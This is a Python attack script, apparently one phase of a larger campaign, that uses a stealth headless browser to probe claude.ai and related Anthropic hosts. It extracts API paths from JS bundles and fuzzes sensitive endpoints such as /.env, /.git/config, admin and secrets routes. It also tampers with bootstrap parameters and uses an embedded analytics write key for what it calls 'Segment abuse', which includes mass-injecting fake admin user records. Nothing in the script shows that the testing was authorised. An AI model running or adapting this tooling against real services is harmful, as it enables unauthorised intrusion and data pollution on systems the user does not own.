#!/usr/bin/env python3
"""
Phase 5: Fetch JS bundles, extract API endpoints, deep Segment abuse,
         bootstrap response diffing, and more tamper techniques.
"""
import asyncio, json, os, re
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/anthropic-phase5"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []
SEGMENT_KEY = "LKJN8LsLERHEOXkw487o7qCTFOrGPimI"

async def test_fetch(page, url, method="GET", body=None, extra_headers=None):
    try:
        body_json = json.dumps(body) if body else "null"
        has_body = body is not None
        hdr_js = ""
        if extra_headers:
            for hk, hv in extra_headers.items():
                hdr_js += f"'{hk}': '{hv}', "
        if has_body:
            r = await page.evaluate(f"""async () => {{
                const start = performance.now();
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{'Content-Type': 'application/json', {hdr_js}}},
                        body: JSON.stringify({body_json})
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 10000), size: text.length, time: performance.now() - start}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        else:
            r = await page.evaluate(f"""async () => {{
                const start = performance.now();
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{{hdr_js}}}
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 10000), size: text.length, time: performance.now() - start}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        return r
    except:
        return {"status": 0, "body": ""}

async def main():
    from cloakbrowser import launch_async
    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    print("🌐 Loading claude.ai...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    # =========================================================================
    # 1. FETCH KEY JS BUNDLES AND EXTRACT API ENDPOINTS
    # =========================================================================
    print("\n" + "="*70)
    print("1. JS BUNDLE API ENDPOINT EXTRACTION")
    print("="*70)

    # Key JS bundles from network interception
    js_urls = [
        "https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/index-5e_lRTjI.js",
        "https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c34d1f91f-BKf8CvSU.js",
        "https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/cbf215181-CAuUU_IK.js",
        "https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c4fba3bc0-CrmtMw7w.js",
        "https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/ce1bfd762-BfiUxHT2.js",
        "https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c85adc124-uphOEy1A.js",
    ]

    all_api_paths = set()
    for js_url in js_urls:
        try:
            js_content = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{js_url}');
                    return await resp.text();
                }} catch(e) {{ return ''; }}
            }}""")
            if js_content:
                # Extract API paths
                patterns = [
                    r'["\']/(api|edge-api)/[\w/._-]+["\']',
                    r'pathname:\s*["\']([\w/._-]+)["\']',
                    r'"/([\w]+)/([\w]+)"',
                    r'\.concat\(["\']([\w/._-]+)["\']\)',
                    r'url:\s*["\']([\w/._-]+)["\']',
                    r'endpoint:\s*["\']([\w/._-]+)["\']',
                    r'path:\s*["\']([\w/._-]+)["\']',
                ]
                for pattern in patterns:
                    matches = re.findall(pattern, js_content)
                    for m in matches:
                        if isinstance(m, tuple):
                            path = "/" + "/".join(m)
                        else:
                            path = m if m.startswith("/") else f"/{m}"
                        if any(kw in path.lower() for kw in ["api", "auth", "user", "admin", "billing", "organization", "team", "project", "conversation", "artifact", "setting", "flag", "feature", "oauth", "token", "session", "account", "profile", "notification", "audit", "gift", "referral", "subscription", "credit", "usage", "mcp", "model", "message", "chat", "prompt", "completion"]):
                            all_api_paths.add(path)
        except:
            pass

    print(f"   Extracted {len(all_api_paths)} API-like paths from JS:")
    for p in sorted(all_api_paths):
        print(f"      {p}")

    with open(f"{OUTPUT_DIR}/extracted-paths.json", "w") as fp:
        json.dump(sorted(list(all_api_paths)), fp, indent=2)

    # Test newly discovered paths
    NEW_PATHS = [p for p in all_api_paths if not p.startswith("/api/auth/login_methods") and not p.startswith("/api/billing/gift/validate")]
    print(f"\n   Testing {len(NEW_PATHS)} new paths...")

    for path in sorted(NEW_PATHS)[:50]:  # Limit to 50
        url = f"https://claude.ai{path}"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        if status not in [0, 404] or ("error" not in body and len(body) > 50):
            print(f"   {path:50s} → {status} | {body[:100]}")
            FINDINGS.append({"technique": "js-extract", "path": path, "status": status, "body": body[:2000]})
            with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                json.dump(FINDINGS, fp, indent=2)
        await asyncio.sleep(0.15)

    # =========================================================================
    # 2. DEEP SEGMENT ABUSE
    # =========================================================================
    print("\n" + "="*70)
    print("2. DEEP SEGMENT ABUSE — Testing all Segment endpoints")
    print("="*70)

    segment_tests = [
        # Try to read Segment project settings
        {"name": "settings-read", "host": "a-cdn.anthropic.com", "path": f"/v1/projects/{SEGMENT_KEY}/settings", "method": "GET"},
        {"name": "settings-api-key", "host": "a-api.anthropic.com", "path": f"/v1/projects/{SEGMENT_KEY}", "method": "GET"},
        {"name": "settings-write-key", "host": "a-api.anthropic.com", "path": f"/v1/projects/{SEGMENT_KEY}/keys", "method": "GET"},

        # Test Segment with different data types
        {"name": "screen-inject", "host": "a-api.anthropic.com", "path": "/v1/screen", "method": "POST",
         "body": {"writeKey": SEGMENT_KEY, "name": "Admin Dashboard", "properties": {"admin": True}}},
        {"name": "page-inject", "host": "a-api.anthropic.com", "path": "/v1/page", "method": "POST",
         "body": {"writeKey": SEGMENT_KEY, "name": "Settings", "properties": {"section": "admin"}}},

        # Test Segment with batch of identifies (mass user creation)
        {"name": "mass-identify", "host": "a-api.anthropic.com", "path": "/v1/batch", "method": "POST",
         "body": {"writeKey": SEGMENT_KEY, "batch": [
             {"type": "identify", "userId": f"test-user-{i}", "traits": {"email": f"user{i}@test.com", "role": "admin"}}
             for i in range(50)
         ]}},

        # Test if write key can be used for other Segment sources
        {"name": "wrong-key", "host": "a-api.anthropic.com", "path": "/v1/batch", "method": "POST",
         "body": {"writeKey": "wrong-key-123", "batch": [{"type": "track", "event": "test"}]}},

        # Test with anonymous ID
        {"name": "anon-identify", "host": "a-api.anthropic.com", "path": "/v1/identify", "method": "POST",
         "body": {"writeKey": SEGMENT_KEY, "anonymousId": "anon-123", "traits": {"email": "anon@test.com"}}},
    ]

    for test in segment_tests:
        url = f"https://{test['host']}{test['path']}"
        r = await test_fetch(page, url, test["method"], test.get("body"))
        status = r.get("status", 0)
        body = r.get("body", "")
        print(f"   {test['name']:25s} → {status} | {body[:100]}")
        FINDINGS.append({"technique": "segment-deep", "test": test["name"], "status": status, "body": body[:2000]})
        with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
            json.dump(FINDINGS, fp, indent=2)
        await asyncio.sleep(0.2)

    # =========================================================================
    # 3. BOOTSTRAP RESPONSE FULL DIFF
    # =========================================================================
    print("\n" + "="*70)
    print("3. BOOTSTRAP RESPONSE DIFF — Extract hidden parameters")
    print("="*70)

    # Get baseline
    r_baseline = await test_fetch(page, "https://claude.ai/edge-api/bootstrap")
    baseline_body = r_baseline.get("body", "")
    baseline_size = r_baseline.get("size", 0)
    print(f"   Baseline: {baseline_size} bytes")

    # Parse and analyze the JSON
    try:
        baseline_json = json.loads(baseline_body)
        print(f"   Top-level keys: {list(baseline_json.keys())}")

        # Analyze statsig
        if "statsig" in baseline_json:
            statsig = baseline_json["statsig"]
            print(f"   Statsig keys: {list(statsig.keys())}")
            if "values" in statsig:
                print(f"   Statsig values count: {len(statsig['values'])}")
                # Show some feature flags
                for k in list(statsig["values"].keys())[:10]:
                    print(f"      {k}: {str(statsig['values'][k])[:80]}")

        # Analyze growthbook
        if "growthbook" in baseline_json:
            gb = baseline_json["growthbook"]
            print(f"   GrowthBook keys: {list(gb.keys())}")
            if "features" in gb:
                print(f"   GrowthBook features count: {len(gb['features'])}")
                for k in list(gb["features"].keys())[:10]:
                    feat = gb["features"][k]
                    print(f"      {k}: defaultValue={feat.get('defaultValue')}")

        # Look for hidden fields
        for key in baseline_json:
            val = baseline_json[key]
            if val is not None and val != {} and val != "" and val != []:
                print(f"   🔥 Non-empty: {key} = {str(val)[:100]}")

    except:
        print(f"   Could not parse JSON: {baseline_body[:200]}")

    # Test with different statsig formats
    print("\n   Testing statsig parameter variations...")
    for params in [
        {"statsig_hashing_algorithm": "sha256"},
        {"statsig_hashing_algorithm": "md5"},
        {"statsig_format": "json"},
        {"statsig_format": "raw"},
        {"growthbook_format": "json"},
        {"growthbook_format": "raw"},
        {"include_anonymous": "true"},
        {"include_all": "true"},
        {"debug": "1"},
        {"verbose": "1"},
        {"expand": "statsig"},
        {"expand": "growthbook"},
    ]:
        url = f"https://claude.ai/edge-api/bootstrap?{urlencode(params)}"
        r = await test_fetch(page, url)
        size = r.get("size", 0)
        status = r.get("status", 0)
        if size != baseline_size:
            print(f"   🔥 {str(params):50s} → {size} bytes (delta: {size - baseline_size})")
            FINDINGS.append({"technique": "bootstrap-param", "params": str(params), "size": size, "delta": size - baseline_size})
            with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                json.dump(FINDINGS, fp, indent=2)
        await asyncio.sleep(0.15)

    # =========================================================================
    # 4. i18n FILE DEEP ANALYSIS
    # =========================================================================
    print("\n" + "="*70)
    print("4. i18n FILE ANALYSIS — Extract internal features")
    print("="*70)

    r_i18n = await test_fetch(page, "https://claude.ai/i18n/en-US.json")
    i18n_body = r_i18n.get("body", "")
    try:
        i18n_json = json.loads(i18n_body)
        print(f"   Total translation keys: {len(i18n_json)}")

        # Look for internal/admin features
        internal_keywords = ["admin", "internal", "debug", "test", "feature", "flag", "experiment", "beta", "secret", "key", "token", "api", "webhook", "deploy", "staging", "production"]
        found_internal = {}
        for key, value in i18n_json.items():
            if isinstance(value, str):
                lower_val = value.lower()
                lower_key = key.lower()
                for kw in internal_keywords:
                    if kw in lower_key or kw in lower_val:
                        if kw not in found_internal:
                            found_internal[kw] = []
                        found_internal[kw].append({"key": key, "value": value[:100]})
                        break

        for kw, items in found_internal.items():
            print(f"\n   [{kw}] ({len(items)} matches):")
            for item in items[:5]:
                print(f"      {item['key']}: {item['value']}")

        with open(f"{OUTPUT_DIR}/i18n-analysis.json", "w") as fp:
            json.dump(found_internal, fp, indent=2)

    except:
        print(f"   Could not parse i18n JSON")

    # =========================================================================
    # 5. ADDITIONAL ENDPOINT DISCOVERY VIA COMMON PATTERNS
    # =========================================================================
    print("\n" + "="*70)
    print("5. COMMON API PATTERN FUZZING")
    print("="*70)

    common_patterns = [
        "/api/v1/users", "/api/v2/users", "/api/internal/users",
        "/api/v1/organizations", "/api/v2/organizations",
        "/api/v1/projects", "/api/v2/projects",
        "/api/v1/conversations", "/api/v2/conversations",
        "/api/v1/messages", "/api/v2/messages",
        "/api/v1/models", "/api/v2/models",
        "/api/v1/admin", "/api/v2/admin",
        "/api/v1/settings", "/api/v2/settings",
        "/api/v1/flags", "/api/v2/flags",
        "/api/v1/features", "/api/v2/features",
        "/api/v1/experiments", "/api/v2/experiments",
        "/api/v1/audit", "/api/v2/audit",
        "/api/v1/logs", "/api/v2/logs",
        "/api/v1/metrics", "/api/v2/metrics",
        "/api/v1/webhooks", "/api/v2/webhooks",
        "/api/v1/integrations", "/api/v2/integrations",
        "/api/v1/keys", "/api/v2/keys",
        "/api/v1/secrets", "/api/v2/secrets",
        "/api/v1/config", "/api/v2/config",
        "/api/v1/status", "/api/v2/status",
        "/api/v1/health", "/api/v2/health",
        "/api/v1/ready", "/api/v2/ready",
        "/api/debug", "/api/health", "/api/status",
        "/api/internal", "/api/system",
        "/graphql", "/graphiql", "/_debug",
        "/_next/data", "/_next/static",
        "/wp-admin", "/wp-json",
        "/.env", "/.git/config", "/robots.txt", "/sitemap.xml",
        "/swagger.json", "/openapi.json", "/api-docs",
    ]

    for path in common_patterns:
        url = f"https://claude.ai{path}"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        size = r.get("size", 0)
        if status not in [0, 404] and size > 50:
            print(f"   {path:40s} → {status} | {size:6d} bytes | {body[:80]}")
            FINDINGS.append({"technique": "common-pattern", "path": path, "status": status, "body": body[:2000], "size": size})
            with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                json.dump(FINDINGS, fp, indent=2)
        await asyncio.sleep(0.1)

    # =========================================================================
    # SAVE
    # =========================================================================
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)

    print(f"\n{'='*70}")
    print(f"📊 PHASE 5 COMPLETE — {len(FINDINGS)} findings")
    print(f"{'='*70}")

    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
